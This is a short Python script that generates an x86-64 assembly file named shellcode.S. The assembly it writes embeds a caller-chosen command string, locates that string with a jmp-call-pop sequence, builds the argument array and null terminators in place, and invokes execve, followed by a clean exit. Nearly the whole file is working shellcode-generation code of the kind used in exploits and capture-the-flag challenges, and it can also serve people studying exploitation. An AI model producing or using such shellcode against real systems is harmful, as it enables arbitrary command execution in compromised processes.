import sys


def main():
    print(sys.argv)
    cmd = sys.argv[1:]

    # header
    output = f"#include <sys/syscall.h>\n\n#define STRING\t\"{' '.join(cmd)}\""

    lens = [len(x) for x in cmd]
    lens = [sum(lens[:i+1])+i for i in range(len(lens))]
    for i, l in enumerate(lens):
        output += f"\n#define STRLEN{i+1}\t{l}"

    output += f"""
#define ARGV\t(STRLEN{i+1}+1)
#define ENVP\t(ARGV+{8*(i+1)})

.intel_syntax noprefix
.text

.globl main
.type  main, @function

main:
  jmp   silly

ballin:
  endbr64
  pop   rbx\t\t\t
 
  /* arg pointer? ;) */ 
  mov   [ARGV + rbx],rbx\t"""

    for i in range(1, len(lens)):
        output += f"""\n
  mov   rcx,rbx
  add   rcx,STRLEN{i}+1
  mov   [ARGV + rbx + {i*8}],rcx\t"""

    output += "\n\n  /* null terminator? ;) */\n  xor   rax,rax"
    for i in range(len(lens)):
        output += f"\n  mov   [STRLEN{i+1} + rbx],al"
    output += "\n  mov   [ENVP + rbx],rax"

    output += """\n
  /* sendit */
  mov   al,SYS_execve
  mov   rdi,rbx
  lea   rsi,[ARGV + rbx]
  lea   rdx,[ENVP + rbx]
  syscall

  /* clean escape */
  xor   rdi,rdi
  xor   rax,rax
  mov   al,SYS_exit
  syscall

silly:
  endbr64
  call    ballin
  .string STRING
"""

    with open("shellcode.S", "w") as f:
        f.write(output)
    print("shellcode.S written")

if __name__ == '__main__':
    main()
